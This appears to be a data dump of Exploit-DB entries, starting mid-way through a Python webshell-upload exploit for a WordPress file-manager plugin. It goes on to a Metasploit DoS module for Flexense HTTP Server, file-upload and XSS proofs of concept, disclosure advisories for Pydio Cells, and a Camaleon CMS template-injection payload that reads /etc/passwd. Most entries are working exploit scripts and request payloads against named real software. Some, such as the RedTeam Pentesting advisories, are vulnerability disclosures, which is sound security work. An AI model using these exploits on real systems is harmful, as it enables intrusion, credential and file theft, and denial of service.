boundary=----WebKitFormBoundaryI52DGCOt37rixRS1"", ""Accept"": ""*/*""} data = ""------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""reqid\""\r\n\r\n\r\n"" data += ""------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""cmd\""\r\n\r\nupload\r\n"" data += ""------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""target\""\r\n\r\nl1_Lw\r\n"" data += ""------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""hashes[l1_cG5nLWNsaXBhcnQtaGFja2VyLWhhY2tlci5wbmc]\""\r\n\r\nexploit.php\r\n"" data += ""------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""action\""\r\n\r\nfma_load_shortcode_fma_ui\r\n"" data += ""------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""_fmakey\""\r\n\r\n""+fmakey+""\r\n"" data += ""------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""path\""\r\n\r\n\r\n"" data += ""------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""url\""\r\n\r\n\r\n"" data += ""------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""w\""\r\n\r\nfalse\r\n"" data += ""------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""r\""\r\n\r\ntrue\r\n"" data += ""------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""hide\""\r\n\r\nplugins\r\n"" data += ""------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""operations\""\r\n\r\nupload,download\r\n"" data += ""------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""path_type\""\r\n\r\ninside\r\n"" data += ""------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""hide_path\""\r\n\r\nno\r\n"" data += ""------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""enable_trash\""\r\n\r\nno\r\n"" data += ""------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""upload_allow\""\r\n\r\ntext/x-php\r\n"" data += ""------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""upload_max_size\""\r\n\r\n2G\r\n"" data += ""------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""upload[]\""; filename=\""exploit2.php\""\r\nContent-Type: text/x-php\r\n\r\n \r\n"" data += ""------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""mtime[]\""\r\n\r\n\r\n------WebKitFormBoundaryI52DGCOt37rixRS1--\r\n"" r = requests.post(url, headers=headers, data=data) print(f""{PROCESS} Sending AJAX request to: {url}"") if 'errUploadMime' in r.text: print(f'{FAIL} Exploit failed!') sys.exit() elif r.headers['Content-Type'].startswith(""text/html""): print(f'{FAIL} Exploit failed! Try to change _fmakey') sys.exit(0) else: print(f'{SUCCESS} Exploit executed with success!') exploited = json.loads(r.text) url = """" print(f'{PROCESS} Getting URL with webshell') for i in exploited[""added""]: url = i['url'] print(f""{PROCESS} Executing '{COMMAND}'"") r = requests.get(url+'?cmd='+COMMAND) print(f'{SUCCESS} The application returned ({len(r.text)} length):\n'+r.text)"
CVE-2018-8065,2023-05-31,exploit db,"# Exploit Title: Flexense HTTP Server 10.6.24 - Buffer Overflow (DoS) (Metasploit) # Date: 2018-03-09 # Exploit Author: Ege Balci # Vendor Homepage: https://www.flexense.com/downloads.html # Version: <= 10.6.24 # CVE : CVE-2018-8065 # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework class MetasploitModule < Msf::Auxiliary include Msf::Auxiliary::Dos include Msf::Exploit::Remote::Tcp def initialize(info = {}) super(update_info(info, 'Name' => 'Flexense HTTP Server Denial Of Service', 'Description' => %q{ This module triggers a Denial of Service vulnerability in the Flexense HTTP server. Vulnerability caused by a user mode write access memory violation and can be triggered with rapidly sending variety of HTTP requests with long HTTP header values. Multiple Flexense applications that are using Flexense HTTP server 10.6.24 and below vesions reportedly vulnerable. 'Author' => [ 'Ege Balci ' ], 'License' => MSF_LICENSE, 'References' => [ 'CVE', '2018-8065'], [ 'URL', 'https://github.com/EgeBalci/Sync_Breeze_Enterprise_10_6_24_-DOS' ], 'DisclosureDate' => '2018-03-09')) register_options( Opt::RPORT(80), OptString.new('PacketCount', [ true, ""The number of packets to be sent (Recommended: Above 1725)"" , 1725 ]), OptString.new('PacketSize', [ true, ""The number of bytes in the Accept header (Recommended: 4088-5090"" , rand(4088..5090) ]) end def check begin connect sock.put(""GET / HTTP/1.0\r\n\r\n"") res = sock.get if res and res.include? 'Flexense HTTP Server v10.6.24' Exploit::CheckCode::Appears else Exploit::CheckCode::Safe end rescue Rex::ConnectionRefused print_error(""Target refused the connection"") Exploit::CheckCode::Unknown rescue print_error(""Target did not respond to HTTP request"") Exploit::CheckCode::Unknown end end def run unless check == Exploit::CheckCode::Appears fail_with(Failure::NotVulnerable, 'Target is not vulnerable.') end size = datastore['PacketSize'].to_i print_status(""Starting with packets of #{size}-byte strings"") count = 0 loop do payload = """" payload << ""GET /"" + Rex::Text.rand_text_alpha(rand(30)) + "" HTTP/1.1\r\n"" payload << ""Host: 127.0.0.1\r\n"" payload << ""Accept: ""+('A' * size)+""\r\n"" payload << ""\r\n\r\n"" begin connect sock.put(payload) disconnect count += 1 break if count==datastore['PacketCount'] rescue ::Rex::InvalidDestination print_error('Invalid destination! Continuing...') rescue ::Rex::ConnectionTimeout print_error('Connection timeout! Continuing...') rescue ::Errno::ECONNRESET print_error('Connection reset! Continuing...') rescue ::Rex::ConnectionRefused print_good(""DoS successful after #{count} packets with #{size}-byte headers"") return true end end print_error(""DoS failed after #{count} packets of #{size}-byte strings"") end end"
CVE-2023-0455,2023-05-31,exploit db,"Exploit Title: - unilogies/bumsys v1.0.3-beta - Unrestricted File Upload Google Dork : NA Date: 19-01-2023 Exploit Author: AFFAN AHMED Vendor Homepage: https://github.com/unilogies/bumsys Software Link: https://github.com/unilogies/bumsys/archive/refs/tags/v1.0.3-beta.zip Version: 1.0.3-beta Tested on: Windows 11, XAMPP-8.2.0 CVE : CVE-2023-0455 Steps_TO_Reproduce - Navigate to this URL:[https://demo.bumsys.org/settings/shop-list/](https://demo.bumsys.org/settings/shop-list/) - Click on action button to edit the Profile - Click on select logo button to upload the image - Intercept the POST Request and do the below changes . Burpsuite-Request POST /xhr/?module=settings&page=updateShop HTTP/1.1 Host: demo.bumsys.org Cookie: eid=1; currencySymbol=%EF%B7%BC; keepAlive=1; __0bb0b4aaf0f729565dbdb80308adac3386976ad3=9lqop41ssg3i9trh73enqbi0i7 Content-Length: 1280 Sec-Ch-Ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99"" X-Csrf-Token: 78abb0cc27ab54e87f66e8160dab3ab48261a8b4 Sec-Ch-Ua-Mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynO0QAD84ekUMuGaA Accept: */* X-Requested-With: XMLHttpRequest Sec-Ch-Ua-Platform: ""Windows"" Origin: https://demo.bumsys.org Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: https://demo.bumsys.org/settings/shop-list/ Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Connection: close ------WebKitFormBoundarynO0QAD84ekUMuGaA Content-Disposition: form-data; name=""shopName"" TEST ------WebKitFormBoundarynO0QAD84ekUMuGaA Content-Disposition: form-data; name=""shopAddress"" test ------WebKitFormBoundarynO0QAD84ekUMuGaA Content-Disposition: form-data; name=""shopCity"" testcity ------WebKitFormBoundarynO0QAD84ekUMuGaA Content-Disposition: form-data; name=""shopState"" teststate ------WebKitFormBoundarynO0QAD84ekUMuGaA Content-Disposition: form-data; name=""shopPostalCode"" 700056 ------WebKitFormBoundarynO0QAD84ekUMuGaA Content-Disposition: form-data; name=""shopCountry"" testIND ------WebKitFormBoundarynO0QAD84ekUMuGaA Content-Disposition: form-data; name=""shopPhone"" 895623122 ------WebKitFormBoundarynO0QAD84ekUMuGaA Content-Disposition: form-data; name=""shopEmail"" test@gmail.com ------WebKitFormBoundarynO0QAD84ekUMuGaA Content-Disposition: form-data; name=""shopInvoiceFooter"" ------WebKitFormBoundarynO0QAD84ekUMuGaA Content-Disposition: form-data; name=""shopLogo""; filename=""profile picture.php"" Content-Type: image/png ==================================================================================== Burpsuite-Response HTTP/1.1 200 OK Date: Thu, 19 Jan 2023 07:14:26 GMT Server: Apache/2.4.51 (Unix) OpenSSL/1.0.2k-fips X-Powered-By: PHP/7.0.33 Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Connection: close Content-Type: text/html; charset=UTF-8 Content-Length: 65 Shop successfully updated. ==================================================================================== VIDEO-"
CVE-2023-0527,2023-05-31,exploit db,#Exploit Title: Online Security Guards Hiring System 1.0 – REFLECTED XSS #Google Dork : NA #Date: 23-01-2023 #Exploit Author : AFFAN AHMED #Vendor Homepage: https://phpgurukul.com #Software Link: https://phpgurukul.com/projects/Online-Security-Guard-Hiring-System_PHP.zip #Version: 1.0 #Tested on: Windows 11 + XAMPP + PYTHON-3.X #CVE : CVE-2023-0527 #NOTE: TO RUN THE PROGRAM FIRST SETUP THE CODE WITH XAMPP AND THEN RUN THE BELOW PYTHON CODE TO EXPLOIT IT # Below code check for both the parameter /admin-profile.php and in /search.php
CVE-2023-33440,2023-05-31,exploit db,"# Exploit Title: Faculty Evaluation System 1.0 - Unauthenticated File Upload # Date: 5/29/2023 # Author: Alex Gan # Vendor Homepage: https://www.sourcecodester.com/php/14635/faculty-evaluation-system-using-phpmysqli-source-code.html # Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/eval_2.zip # Version: 1.0 # Tested on: LAMP Fedora server 38 (Thirty Eight) Apache/2.4.57 10.5.19-MariaDB PHP 8.2.6 # CVE: CVE-2023-33440 # References: https://nvd.nist.gov/vuln/detail/CVE-2023-33440 # https://www.exploit-db.com/exploits/49320 # https://github.com/F14me7wq/bug_report/tree/main/vendors/oretnom23/faculty-evaluation-system #!/usr/bin/env python3 import os import sys import requests import argparse from bs4 import BeautifulSoup from urllib.parse import urlparse from requests.exceptions import ConnectionError, Timeout def get_args(): parser = argparse.ArgumentParser() parser.add_argument('-u', '--url', type=str, help='URL') parser.add_argument('-p', '--payload', type=str, help='PHP webshell') return parser.parse_args() def get_user_input(args): if not (args.url): args.url = input('Use the -u argument or Enter URL:') if not (args.payload): args.payload = input('Use the -p argument or Enter file path PHP webshell: ') return args.url, args.payload def check_input_url(url): parsed_url = urlparse(url) if not parsed_url.scheme: url = 'http://' + url if parsed_url.path.endswith('/'): url = url.rstrip('/') return url def check_host_availability(url): try: response = requests.head(url=url + '/login.php') if response.status_code == 200: print(""[+] Host is accessible"") else: print(""[-] Host is not accessible"") print("" Status code:"", response.status_code) sys.exit() except (ConnectionError, Timeout) as e: print(""[-] Host is not accessible"") sys.exit() except requests.exceptions.RequestException as e: print(""[-] Error:"", e) sys.exit() def make_request(url, method, files=None): if method == 'GET': response = requests.get(url) elif method == 'POST': response = requests.post(url, files=files) else: raise ValueError(f'Invalid HTTP method: {method}') if response.status_code == 200: print('[+] Request successful') return response.text else: print(f'[-] Error {response.status_code}: {response.text}') return None def find_file(response_get, filename, find_url): soup = BeautifulSoup(response_get, 'html.parser') links = soup.find_all('a') found_files = [] for link in links: file_upl = link.get('href') if file_upl.endswith(filename): found_files.append(file_upl) if found_files: print(' File found:') for file in found_files: print('[*] ' + file) print(' Full URL of your file:') for file_url in found_files: print('[*] ' + find_url + file_url) else: print('[-] File not found') def main(): args = get_args() url, payload = get_user_input(args) url = check_input_url(url) check_host_availability(url) post_url = url + ""/ajax.php?action=save_user"" get_url = url + ""/assets/uploads/"" filename = os.path.basename(payload) payload_file = [('img',(filename,open(args.payload,'rb'),'application/octet-stream'))] print("" Loading payload file"") make_request(post_url, 'POST', files=payload_file) print("" Listing the uploads directory"") response_get = make_request(get_url, 'GET') print("" Finding the downloaded payload file"") find_file(response_get, filename, get_url) if __name__ == ""__main__"": main()"
CVE-2023-32749,2023-05-31,exploit db,"Exploit Title: Pydio Cells 4.1.2 - Unauthorised Role Assignments Affected Versions: 4.1.2 and earlier versions Fixed Versions: 4.2.0, 4.1.3, 3.0.12 Vulnerability Type: Privilege Escalation Security Risk: high Vendor URL: https://pydio.com/ Vendor Status: notified Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2023-003 Advisory Status: published CVE: CVE-2023-32749 CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-32749 Introduction ""Pydio Cells is an open-core, self-hosted Document Sharing and Collaboration platform (DSC) specifically designed for organizations that need advanced document sharing and collaboration without security trade-offs or compliance issues."" (from the vendor's homepage) More Details Users can share cells or folders with other users on the same Pydio instance. The web application allows to either select an already existing user from a list or to create a new user by entering a new username and password, if this functionality is enabled. When creating a new user in this way, a HTTP PUT request like the following is sent: PUT /a/user/newuser HTTP/2 Host: example.com User-Agent: agent Authorization: Bearer O48gvjD[...] Content-Type: application/json Content-Length: 628 Cookie: token=AO[...] ""Attributes"": { ""profile"": ""shared"", ""parameter:core.conf:lang"": ""\""en-us\"""", ""send_email"": ""false"" ""Roles"": [], ""Login"": ""newuser"", ""Password"": ""secret!"", ""GroupPath"": ""/"", ""Policies"": [...] The JSON object sent in the body contains the username and password for the user to be created and an empty list for the key ""Roles"". The response contains a JSON object similar to the following: ""Uuid"": ""58811c4c-2286-4ca0-8e8a-14ab9dbca8ce"", ""GroupPath"": ""/"", ""Attributes"": { ""parameter:core.conf:lang"": ""\""en-us\"""", ""profile"": ""shared"" ""Roles"": [ ""Uuid"": ""EXTERNAL_USERS"", ""Label"": ""External Users"", ""Policies"": [...] ""Uuid"": ""58811c4c-2286-4ca0-8e8a-14ab9dbca8ce"", ""Label"": ""User newuser"", ""UserRole"": true, ""Policies"": [...] ""Login"": ""newuser"", ""Policies"": [....], ""PoliciesContextEditable"": true The key ""Roles"" now contains a list with two objects, which seem to be applied by default. The roles list in the HTTP request can be modified to contain a list of all available UUIDs for roles, which can be obtained by using the user search functionality. This results in a new user account with all roles applied. By performing a login as the newly created user, access to all cells and non-personal workspaces of the whole Pydio instance is granted. Proof of Concept Login to the Pydio Cells web interface with a regular user and retrieve the JWT from the HTTP requests. This can either be done using an HTTP attack proxy or using the browser's developer tools. Subsequently, curl [1] can be used as follows to retrieve a list of all users and their roles: $ export JWT="" "" $ curl --silent \ --header ""Authorization: Bearer $TOKEN"" \ --header 'Content-Type: application/json' \ --data '{}' \ https://example.com/a/user | tee all_users.json {""Users"":[...]} Afterwards, jq [2] can be used to create a JSON document which can be sent to the Pydio REST-API in order to create the external user ""foobar"" with the password ""hunter2"" and all roles assigned: $ jq '.Users[].Roles' all_users.json \ | jq -s 'flatten | .[].Uuid | {Uuid: .}' \ | jq -s 'unique' \ | jq '{""Login"": ""foobar"", ""Password"": ""hunter2"", ""Attributes"": {""profile"": ""shared""}, ""Roles"": .}' \ | tee create_user.json ""Login"": ""foobar"", ""Password"": ""hunter2"", ""Attributes"": { ""profile"": ""shared"" ""Roles"": [...] Finally, the following curl command can be issued to create the new external user: $ curl --request PUT \ --silent \ --header ""Authorization: Bearer $JWT"" \ --header 'Content-Type: application/json' \ --data @create_user.json \ https://example.com/a/user/foobar Now, login with the newly created user to access all cells and non-personal workspaces. Workaround Disallow the creation of external users in the authentication settings. Fix Upgrade Pydio Cells to a version without the vulnerability. Security Risk Attackers with access to any regular user account for a Pydio Cells instance can extend their privileges by creating a new external user with all roles assigned. Subsequently, they can access all folders and files in any cell and workspace, except for personal workspaces. The creation of external users is activated by default. Therefore, the vulnerability is estimated to pose a high risk. Timeline 2023-03-23 Vulnerability identified 2023-05-02 Customer approved disclosure to vendor 2023-05-02 Vendor notified 2023-05-03 CVE ID requested 2023-05-08 Vendor released fixed version 2023-05-14 CVE ID assigned 2023-05-16 Vendor asks for a few more days before the advisory is released 2023-05-30 Advisory released References [1] https://curl.se/ [2] https://stedolan.github.io/jq/ RedTeam Pentesting GmbH RedTeam Pentesting offers individual penetration tests performed by a team of specialised IT-security experts. Hereby, security weaknesses in company networks or products are uncovered and can be fixed immediately. As there are only few experts in this field, RedTeam Pentesting wants to share its knowledge and enhance the public knowledge with research in security-related areas. The results are made available as public security advisories. More information about RedTeam Pentesting can be found at: https://www.redteam-pentesting.de/ Working at RedTeam Pentesting RedTeam Pentesting is looking for penetration testers to join our team in Aachen, Germany. If you are interested please visit: https://jobs.redteam-pentesting.de/"
CVE-2023-32751,2023-05-31,exploit db,"Exploit Title: Pydio Cells 4.1.2 - Cross-Site Scripting (XSS) via File Download Affected Versions: 4.1.2 and earlier versions Fixed Versions: 4.2.0, 4.1.3, 3.0.12 Vulnerability Type: Cross-Site Scripting Security Risk: high Vendor URL: https://pydio.com/ Vendor Status: notified Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2023-004 Advisory Status: published CVE: CVE-2023-32751 CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-32751 Introduction ""Pydio Cells is an open-core, self-hosted Document Sharing and Collaboration platform (DSC) specifically designed for organizations that need advanced document sharing and collaboration without security trade-offs or compliance issues."" (from the vendor's homepage) More Details When a file named ""xss.html"" is downloaded in the Pydio Cells web application, a download URL similar to the following is generated: https://example.com/io/xss/xss.html ?AWSAccessKeyId=gateway &Expires=1682495748 &Signature=920JV0Zy%2BrNYXjak7xksAxRpRp8%3D &response-content-disposition=attachment%3B%20filename%3Dxss.html &pydio_jwt=qIe9DUut-OicxRzNVlynMf6CTENB0J-J[...] The URL is akin to a presigned URL as used by the Amazon S3 service. It contains the URL parameter ""response-content-disposition"" which is set to ""attachment"" causing the response to contain a ""Content-Disposition"" header with that value. Therefore, the browser downloads the file instead of interpreting it. The URL also contains a signature and expiry timestamp, which are checked by the backend. Unlike a presigned URL as used by S3, the URL also contains the parameter ""pydio_jwt"" with the JWT of the user for authentication. Furthermore, the access key with the ID ""gateway"" is referenced, which can be found in the JavaScript sources of Pydio Cells together with the secret: _awsSdk.default.config.update({ accessKeyId: 'gateway', secretAccessKey: 'gatewaysecret', s3ForcePathStyle: !0, httpOptions: { timeout: PydioApi.getMultipartUploadTimeout() With this information it is possible to change the URL parameter ""response-content-disposition"" to the value ""inline"" and then calculate a valid signature for the resulting URL. Furthermore, the content type of the response can be changed to ""text/html"" by also adding the URL parameter ""response-content-type"" with that value. This would result in a URL like the following for the previously shown example URL: https://example.com/io/xss/xss.html? AWSAccessKeyId=gateway &Expires=1682495668 &Signature=HpKue0YQZrnp%2B665Jf1t7ONgfRg%3D &response-content-disposition=inline &response-content-type=text%2Fhtml &pydio_jwt=qIe9DUut-OicxRzNVlynMf6CTENB0J-J[...] Upon opening the URL in a browser, the HTML included in the file is interpreted and any JavaScript code is run. Proof of Concept Upload a HTML file into an arbitrary location of a Pydio Cells instance. For example with the following contents: ------------------------------------------------------------------------ Cross-Site Scriping ------------------------------------------------------------------------ The contained JavaScript code reads the JWT access token for Pydio Cells from the browser's local storage object and opens a message box. Instead of just displaying the JWT, it could also be sent to an attacker. The following JavaScript function can then be run within the browser's developer console to generate a presigned URL for the HTML file: async function getPresignedURL(path) { let client = PydioApi.getClient(); let node = new AjxpNode(path); let metadata = {Bucket: ""io"", ResponseContentDisposition: ""inline"", Key: path, ResponseContentType: ""text/html""}; let url = await client.buildPresignedGetUrl(node, null, ""text/html"", metadata); return url; await getPresignedURL(""xss/xss.html""); The code has to be run in context of Pydio Cells while being logged in. If the resulting URL is opened in a browser, the JavaScript code contained in the HTML file is run. If the attack is conducted in the described way, the JWT of the attacker is exposed through the URL. However, this can be circumvented by first generating a public URL for the file and then constructing the presigned URL based on the resulting download URL. Workaround No workaround known. Fix Upgrade Pydio Cells to a version without the vulnerability. Security Risk Attackers that can upload files to a Pydio Cells instance can construct URLs that execute arbitrary JavaScript code in context of Pydio Cells upon opening. This could for example be used to steal the authentication tokens of users opening the URL. It is likely that such an attack succeeds, since sharing URLs to files hosted using Pydio Cells is a common use case of the application. Therefore, the vulnerability is estimated to pose a high risk. Timeline 2023-03-23 Vulnerability identified 2023-05-02 Customer approved disclosure to vendor 2023-05-02 Vendor notified 2023-05-03 CVE ID requested 2023-05-08 Vendor released fixed version 2023-05-14 CVE ID assigned 2023-05-16 Vendor asks for a few more days before the advisory is released 2023-05-30 Advisory released References [1] https://aws.amazon.com/sdk-for-javascript/ RedTeam Pentesting GmbH RedTeam Pentesting offers individual penetration tests performed by a team of specialised IT-security experts. Hereby, security weaknesses in company networks or products are uncovered and can be fixed immediately. As there are only few experts in this field, RedTeam Pentesting wants to share its knowledge and enhance the public knowledge with research in security-related areas. The results are made available as public security advisories. More information about RedTeam Pentesting can be found at: https://www.redteam-pentesting.de/ Working at RedTeam Pentesting RedTeam Pentesting is looking for penetration testers to join our team in Aachen, Germany. If you are interested please visit: https://jobs.redteam-pentesting.de/ RedTeam Pentesting GmbH Tel.: +49 241 510081-0 Alter Posthof 1 Fax : +49 241 510081-99 52062 Aachen https://www.redteam-pentesting.de Germany Registergericht: Aachen HRB 14004 Geschäftsführer: Patrick Hof, Jens Liebchen"
CVE-2023-32750,2023-05-31,exploit db,"Exploit Title: Pydio Cells 4.1.2 - Server-Side Request Forgery Affected Versions: 4.1.2 and earlier versions Fixed Versions: 4.2.0, 4.1.3, 3.0.12 Vulnerability Type: Server-Side Request Forgery Security Risk: medium Vendor URL: https://pydio.com/ Vendor Status: notified Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2023-005 Advisory Status: published CVE: CVE-2023-32750 CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-32750 Introduction ""Pydio Cells is an open-core, self-hosted Document Sharing and Collaboration platform (DSC) specifically designed for organizations that need advanced document sharing and collaboration without security trade-offs or compliance issues."" (from the vendor's homepage) More Details Using the REST-API of Pydio Cells it is possible to start jobs. For example, when renaming a file or folder an HTTP request similar to the following is sent: PUT /a/jobs/user/move HTTP/2 Host: example.com User-Agent: agent Accept: application/json Authorization: Bearer G4ZRN[...] Content-Type: application/json Content-Length: 140 ""JobName"": ""move"", ""JsonParameters"": ""{\""nodes\"":[\""cell/file.txt\""],\""target\"":\""cell/renamed.txt\"",\""targetParent\"":false}"" The body contains a JSON object with a job name and additional parameters for the job. Besides the ""move"" job, also a job with the name ""remote-download"" exists. It takes two additional parameters: ""urls"" and ""target"". In the ""urls"" parameter, a list of URLs can be specified and in the parameter ""target"" a path can be specified in which to save the response. When the job is started, HTTP GET requests are sent from the Pydio Cells server to the specified URLs. The responses are saved into a file, which are uploaded to the specified folder within Pydio Cells. Potential errors are transmitted in a WebSocket channel, which can be opened through the ""/ws/event"" endpoint. Proof of Concept Log into Pydio Cells and retrieve the JWT from the HTTP requests. Then, run the following commands to start a ""remote-download"" job to trigger an HTTP request: $ export JWT="" "" $ echo '{""urls"": [""http://localhost:8000/internal.html""], ""target"": ""personal-files""}' \ | jq '{""JobName"": ""remote-download"", ""JsonParameters"": (. | tostring)}' \ | tee remote-download.json $ curl --header ""Authorization: Bearer $JWT"" \ --header 'Content-Type: application/json' \ --request PUT \ --data @remote-download.json 'https://example.com/a/jobs/user/remote-download' The URL in the JSON document specifies which URL to request. The ""target"" field in the same document specifies into which folder the response is saved. Afterwards, the response is contained in a file in the specified folder. Potential errors are communicated through the WebSocket channel. Workaround Limit the services which can be reached by the Pydio Cells server, for example using an outbound firewall. Fix Upgrade Pydio Cells to a version without the vulnerability. Security Risk The risk is highly dependent on the environment in which the attacked Pydio Cells instance runs. If there are any internal HTTP services which expose sensitive data on the same machine or within the same network, the server-side request forgery vulnerability could pose a significant risk. In other circumstances, the risk could be negligible. Therefore, overall the vulnerability is rated as a medium risk. Timeline 2023-03-23 Vulnerability identified 2023-05-02 Customer approved disclosure to vendor 2023-05-02 Vendor notified 2023-05-03 CVE ID requested 2023-05-08 Vendor released fixed version 2023-05-14 CVE ID assigned 2023-05-16 Vendor asks for a few more days before the advisory is released 2023-05-30 Advisory released References RedTeam Pentesting GmbH RedTeam Pentesting offers individual penetration tests performed by a team of specialised IT-security experts. Hereby, security weaknesses in company networks or products are uncovered and can be fixed immediately. As there are only few experts in this field, RedTeam Pentesting wants to share its knowledge and enhance the public knowledge with research in security-related areas. The results are made available as public security advisories. More information about RedTeam Pentesting can be found at: https://www.redteam-pentesting.de/ Working at RedTeam Pentesting RedTeam Pentesting is looking for penetration testers to join our team in Aachen, Germany. If you are interested please visit: https://jobs.redteam-pentesting.de/"
CVE-2023-30145,2023-05-26,exploit db,"Exploit Title: Camaleon CMS v2.7.0 - Server-Side Template Injection (SSTI) Exploit Author: PARAG BAGUL CVE: CVE-2023-30145 ## Description Camaleon CMS v2.7.0 was discovered to contain a Server-Side Template Injection (SSTI) vulnerability via the formats parameter. ## Affected Component All versions below 2.7.0 are affected. ## Author Parag Bagul ## Steps to Reproduce 1. Open the target URL: `https://target.com/admin/media/upload` 2. Upload any file and intercept the request. 3. In the `formats` parameter value, add the payload `test<%= 7*7 %>test`. 4. Check the response. It should return the multiplication of 77 with the message ""File format not allowed (dqopi49vuuvm)"". ##Detection: #Request: POST /admin/media/upload?actions=false HTTP/1.1 Host: target.com User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: / Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://target.com/admin/profile/edit X-Requested-With: XMLHttpRequest Content-Type: multipart/form-data; boundary=---------------------------327175120238370517612522354688 Content-Length: 1200 Origin: http://target.com DNT: 1 Connection: close Cookie: cookie -----------------------------327175120238370517612522354688 Content-Disposition: form-data; name=""file_upload""; filename=""test.txt"" Content-Type: text/plain test -----------------------------327175120238370517612522354688 Content-Disposition: form-data; name=""versions"" -----------------------------327175120238370517612522354688 Content-Disposition: form-data; name=""thumb_size"" -----------------------------327175120238370517612522354688 Content-Disposition: form-data; name=""formats"" test<%= 7*7 %>test -----------------------------327175120238370517612522354688 Content-Disposition: form-data; name=""media_formats"" image -----------------------------327175120238370517612522354688 Content-Disposition: form-data; name=""dimension"" -----------------------------327175120238370517612522354688 Content-Disposition: form-data; name=""private"" -----------------------------327175120238370517612522354688 Content-Disposition: form-data; name=""folder"" -----------------------------327175120238370517612522354688 Content-Disposition: form-data; name=""skip_auto_crop"" true -----------------------------327175120238370517612522354688-- #Response: HTTP/1.1 200 OK Content-Type: text/html; charset=utf-8 Connection: close Status: 200 OK Cache-Control: max-age=0, private, must-revalidate Set-Cookie: cookie Content-Length: 41 File format not allowed (test49test) #Exploitation: To execute a command, add the following payload: testqopi<%= File.open('/etc/passwd').read %>fdtest Request: POST /admin/media/upload?actions=true HTTP/1.1 Host: target.com User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: / Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://target.com/admin/media X-Requested-With: XMLHttpRequest Content-Type: multipart/form-data; boundary=---------------------------104219633614133026962934729021 Content-Length: 1237 Origin: http://target.com DNT: 1 Connection: close Cookie: cookie -----------------------------104219633614133026962934729021 Content-Disposition: form-data; name=""file_upload""; filename=""test.txt"" Content-Type: text/plain test -----------------------------104219633614133026962934729021 Content-Disposition: form-data; name=""versions"" -----------------------------104219633614133026962934729021 Content-Disposition: form-data; name=""thumb_size"" -----------------------------104219633614133026962934729021 Content-Disposition: form-data; name=""formats"" dqopi<%= File.open('/etc/passwd').read %>fdfdsf -----------------------------104219633614133026962934729021 Content-Disposition: form-data; name=""media_formats"" -----------------------------104219633614133026962934729021 Content-Disposition: form-data; name=""dimension"" -----------------------------104219633614133026962934729021 Content-Disposition: form-data; name=""private"" -----------------------------104219633614133026962934729021 Content-Disposition: form-data; name=""folder"" -----------------------------104219633614133026962934729021 Content-Disposition: form-data; name=""skip_auto_crop"" true -----------------------------104219633614133026962934729021-- Response: Response: HTTP/1.1 200 OK Content-Type: text/html; charset=utf-8 Connection: close Status: 200 OK Set-Cookie: cookie Content-Length: 1816 File format not allowed (dqopiroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin fdfdsf)"
